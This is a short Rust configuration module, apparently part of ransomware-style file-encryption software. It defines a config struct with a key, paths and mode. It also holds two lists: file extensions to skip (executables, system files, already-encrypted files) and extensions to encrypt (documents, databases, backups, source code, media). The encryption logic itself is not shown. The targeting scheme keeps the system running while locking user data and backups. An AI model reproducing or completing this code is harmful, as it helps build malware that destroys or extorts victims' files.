use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct Config {
	pub key: String,
	pub paths: Vec<String>,
	pub mode: String,
	pub encrypt_extensions_only: bool, // true = только target расширения, false = все кроме ignore
}

pub const IGNORE_EXTENSIONS: &[&str] = &[
	"exe", "dll", "sys", "drv", "ocx", "cpl",
	"enc", "aes", "crypt",
	"ini", "cfg", "conf", "config", "json",
	"tmp", "temp", "log", "cache",
	"bat", "cmd", "ps1", "vbs", "js", "vbe",
	"zip", "rar", "7z", "gz", "bz2", "xz", "tar",
	"mp3", "mp4", "avi", "mkv", "mov", "wmv", "flv",
	"jpg", "jpeg", "png", "gif", "bmp", "ico", "svg",
];

pub const TARGET_EXTENSIONS: &[&str] = &[
	"txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
	"pdf", "rtf", "odt", "ods", "odp",
	"jpg", "jpeg", "png", "gif", "bmp", "tiff", "psd",
	"mp3", "wav", "flac", "aac", "ogg",
	"mp4", "avi", "mkv", "mov", "wmv", "flv", "webm",
	"zip", "rar", "7z", "tar", "gz", "bz2",
	"db", "sqlite", "mdb", "accdb",
	"bak", "backup", "old", "save",
	"c", "cpp", "h", "hpp", "rs", "go", "py", "java", "class",
	"cs", "vb", "php", "html", "css", "js", "ts", "json", "xml",
	"psd", "ai", "eps", "cdr",
];